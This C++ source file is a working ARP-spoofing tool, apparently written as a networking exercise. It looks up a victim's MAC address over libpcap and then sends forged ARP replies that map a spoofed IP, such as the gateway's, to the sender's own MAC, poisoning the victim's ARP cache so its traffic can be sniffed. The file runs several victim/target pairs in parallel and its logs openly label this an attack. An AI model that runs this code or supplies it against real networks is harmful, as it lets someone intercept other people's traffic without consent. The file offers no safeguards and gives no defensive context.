#include <iostream>
#include <execution>
#include <memory>
#include <pcap.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "packet.h"

#include "log.inl"
#include "wiretapper.h"


void prt_usage()
{
	LOG(FAIL) << "invalid usage";
	LOG(NOTE) << "usage: send-arp <interface> [<victim-ip> <target-ip>]...";
	LOG(NOTE) << "sample: send-arp wlan0 <victim-ip> <gateway-ip>";
}

bool arp_target(
		const std::shared_ptr<pcap_t>& pcap,
		const IPv4& self_ip,
		const MAC& self_mac,
		const std::string_view& victim_str,
		const std::string_view& fake_ip_str)
{
	IPv4 victim_ip(victim_str);
	IPv4 fake_ip(fake_ip_str);

	// GET VICTIM'S INFORMATION
	LOG(INFO) << victim_str << ": loading MAC...";
	PACKET query(pcap);
	query.smac.set(self_mac);
	query.dmac.set(MAC(MAC::BROADCAST));
	query.sip.set(self_ip);
	query.dip.set(victim_ip);
	query.op.set(ARP::Request);

	auto query_rsp = query.send_async().get();
	if (!query_rsp)
	{
		LOG(WARN) << "could not query victim info";
		return false;
	}

	auto query_con = query_rsp.value();
	auto victim_mac = query_con.smac.get();

	// PRT VICTIM'S INFORMATION
	LOG(NOTE) << " victim ip | " << static_cast<std::string>(victim_ip);
	LOG(NOTE) << "victim mac | " << static_cast<std::string>(victim_mac);

	// SEND ATTACK INFORMATION
	LOG(INFO) << victim_str << ": preparing attack packet";
	PACKET attack(pcap);
	attack.smac.set(self_mac);
	attack.dmac.set(victim_mac);
	attack.sip.set(fake_ip);
	attack.dip.set(victim_ip);
	attack.op.set(ARP::Reply);

	auto attack_rsp = attack.send();
	if (!attack_rsp)
	{
		LOG(WARN) << "could not send attack packet";
		return false;
	}

	LOG(NOTE) << "attack packet sent. watch your sniffer";

	return true;
}

int main(int argc, char* argv[])
{
	if (argc < 3 || argc % 2 != 0)
	{
		prt_usage();
		return -1;
	}

	std::string_view dev(argv[1]);


	std::array<char, PCAP_ERRBUF_SIZE> err{};
	std::shared_ptr<pcap_t> pcap(
			pcap_open_live(dev.data(), BUFSIZ, 1, 1, err.data()),
			[](pcap_t* p) { pcap_close(p); }
	);
	if (pcap == nullptr)
	{
		LOG(FAIL) << "couldn't open device" << dev << '(' << std::string_view(err) << ")\n";
		return -1;
	}

	pcap_set_immediate_mode(pcap.get(), true);

	wiretapper wt(pcap);
	wt.boot();

	std::vector<std::tuple<std::string_view, std::string_view>> targets;
	targets.reserve(argc / 2 - 1);
	for (size_t i = 2; i < static_cast<size_t>(argc) - 1; i += 2)
		targets.emplace_back(argv[i], argv[i + 1]);


	auto self_ip_r = IPv4::self(dev);
	auto self_mac_r = MAC::self(dev);

	if (!self_ip_r)
	{
		LOG(FAIL) << "could not get local IP";
		return -1;
	}
	if (!self_mac_r)
	{
		LOG(FAIL) << "could not get local MAC";
		return -1;
	}

	auto self_ip = self_ip_r.value();
	auto self_mac = self_mac_r.value();

	LOG(NOTE) << "interface | " << dev;
	LOG(NOTE) << " local ip | " << static_cast<std::string>(self_ip);
	LOG(NOTE) << "local mac | " << static_cast<std::string>(self_mac);

	std::for_each(
			std::execution::par_unseq,
			targets.begin(),
			targets.end(),
			[pcap, &self_ip, &self_mac](const std::tuple<std::string_view, std::string_view>& target)
			{
				arp_target(pcap, self_ip, self_mac, get<0>(target), get<1>(target));
			});

	wt.stop();
}
